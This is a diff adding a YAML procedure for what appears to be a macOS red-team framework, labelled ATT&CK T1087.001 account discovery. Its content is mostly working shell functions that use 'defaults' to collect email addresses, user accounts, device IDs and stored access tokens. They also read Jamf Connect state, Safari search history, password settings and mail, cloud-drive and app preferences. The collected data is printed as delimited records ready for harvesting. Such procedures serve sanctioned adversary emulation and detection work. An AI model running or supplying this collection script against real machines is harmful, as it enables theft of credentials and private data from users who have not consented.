@@ -1,0 +1,172 @@
+procedure_name: find_account_defaults
+ttp_id: T1087.001
+tactic: Discovery
+guid: 2488a056-5b6d-4a3a-b9d2-782019190eb8
+intent: Find account information and user data using defaults read commands to search
+  application preferences and system settings
+author: '@darmado | https://x.com/darmad0'
+version: 1.0.3
+created: '2025-01-27'
+updated: '2025-06-03'
+procedure:
+  arguments:
+  - option: --email-search
+    description: Search for email addresses in defaults
+    execute_function:
+    - find_email_addresses
+  - option: --account-search
+    description: Search for user accounts and device IDs
+    execute_function:
+    - find_user_accounts
+  - option: --app-data
+    description: Search application preferences for user data
+    execute_function:
+    - find_app_user_data
+  - option: --all
+    description: Run all account discovery searches
+    execute_function:
+    - find_email_addresses
+    - find_user_accounts
+    - find_app_user_data
+  global_variable:
+  - name: CMD_DEFAULTS
+    type: string
+    default_value: defaults
+  functions:
+  - name: find_email_addresses
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+    code: |
+      find_email_addresses() {
+          $CMD_PRINTF "SEARCH_TYPE|COMMAND|RESULT\n"
+          
+          # Find email addresses
+          local email_result
+          email_result=$($CMD_DEFAULTS find EmailAddress 2>/dev/null)
+          if [ -n "$email_result" ]; then
+              $CMD_PRINTF "EMAIL|defaults find EmailAddress|%s\n" "$email_result"
+          fi
+          
+          # Find owner email addresses
+          local owner_result
+          owner_result=$($CMD_DEFAULTS find OwnerEmailAddress 2>/dev/null)
+          if [ -n "$owner_result" ]; then
+              $CMD_PRINTF "OWNER_EMAIL|defaults find OwnerEmailAddress|%s\n" "$owner_result"
+          fi
+          
+          # Grammarly email data
+          local grammarly_result
+          grammarly_result=$($CMD_DEFAULTS read com.grammarly.ProjectLlama 2>/dev/null)
+          if [ -n "$grammarly_result" ]; then
+              $CMD_PRINTF "GRAMMARLY_DATA|defaults read com.grammarly.ProjectLlama|%s\n" "$grammarly_result"
+          fi
+          
+          return 0
+      }
+  - name: find_user_accounts
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+    code: |
+      find_user_accounts() {
+          $CMD_PRINTF "SEARCH_TYPE|COMMAND|RESULT\n"
+          
+          # Find user accounts
+          local account_result
+          account_result=$($CMD_DEFAULTS find userAccount 2>/dev/null)
+          if [ -n "$account_result" ]; then
+              $CMD_PRINTF "USER_ACCOUNT|defaults find userAccount|%s\n" "$account_result"
+          fi
+          
+          # Find device identifiers
+          local device_result
+          device_result=$($CMD_DEFAULTS find DeviceIdentifier 2>/dev/null)
+          if [ -n "$device_result" ]; then
+              $CMD_PRINTF "DEVICE_ID|defaults find DeviceIdentifier|%s\n" "$device_result"
+          fi
+          
+          # Find access tokens
+          local token_result
+          token_result=$($CMD_DEFAULTS find access_token 2>/dev/null | sed 's/\\\\//g')
+          if [ -n "$token_result" ]; then
+              $CMD_PRINTF "ACCESS_TOKEN|defaults find access_token|%s\n" "$token_result"
+          fi
+          
+          # JAMF state
+          local jamf_result
+          jamf_result=$($CMD_DEFAULTS read com.jamf.connect.state 2>/dev/null)
+          if [ -n "$jamf_result" ]; then
+              $CMD_PRINTF "JAMF_STATE|defaults read com.jamf.connect.state|%s\n" "$jamf_result"
+          fi
+          
+          return 0
+      }
+  - name: find_app_user_data
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+    code: |
+      find_app_user_data() {
+          $CMD_PRINTF "SEARCH_TYPE|COMMAND|RESULT\n"
+          
+          # Safari data
+          local safari_searches
+          safari_searches=$($CMD_DEFAULTS read com.apple.Safari RecentWebSearches 2>/dev/null)
+          if [ -n "$safari_searches" ]; then
+              $CMD_PRINTF "SAFARI_SEARCHES|defaults read com.apple.Safari RecentWebSearches|%s\n" "$safari_searches"
+          fi
+          
+          # Password settings
+          local password_settings
+          password_settings=$($CMD_DEFAULTS read com.apple.Passwords-Settings.extension 2>/dev/null)
+          if [ -n "$password_settings" ]; then
+              $CMD_PRINTF "PASSWORD_SETTINGS|defaults read com.apple.Passwords-Settings.extension|%s\n" "$password_settings"
+          fi
+          
+          # Microsoft To-Do
+          local todo_result
+          todo_result=$($CMD_DEFAULTS read com.microsoft.to-do-mac 2>/dev/null)
+          if [ -n "$todo_result" ]; then
+              $CMD_PRINTF "TODO_DATA|defaults read com.microsoft.to-do-mac|%s\n" "$todo_result"
+          fi
+          
+          # CapCut data
+          local capcut_result
+          capcut_result=$($CMD_DEFAULTS read com.lemon.lvoverseas 2>/dev/null)
+          if [ -n "$capcut_result" ]; then
+              $CMD_PRINTF "CAPCUT_DATA|defaults read com.lemon.lvoverseas|%s\n" "$capcut_result"
+          fi
+          
+          # Google Drive settings
+          local gdrive_result
+          gdrive_result=$($CMD_DEFAULTS read com.google.drivefs.settings 2>/dev/null)
+          if [ -n "$gdrive_result" ]; then
+              $CMD_PRINTF "GDRIVE_SETTINGS|defaults read com.google.drivefs.settings|%s\n" "$gdrive_result"
+          fi
+          
+          # Mail settings
+          local mail_result
+          mail_result=$($CMD_DEFAULTS read com.apple.mail 2>/dev/null)
+          if [ -n "$mail_result" ]; then
+              $CMD_PRINTF "MAIL_SETTINGS|defaults read com.apple.mail|%s\n" "$mail_result"
+          fi
+          
+          # Notification Center preferences
+          local ncprefs_result
+          ncprefs_result=$($CMD_DEFAULTS read com.apple.ncprefs 2>/dev/null)
+          if [ -n "$ncprefs_result" ]; then
+              $CMD_PRINTF "NOTIFICATION_PREFS|defaults read com.apple.ncprefs|%s\n" "$ncprefs_result"
+          fi
+          
+          return 0
+      }
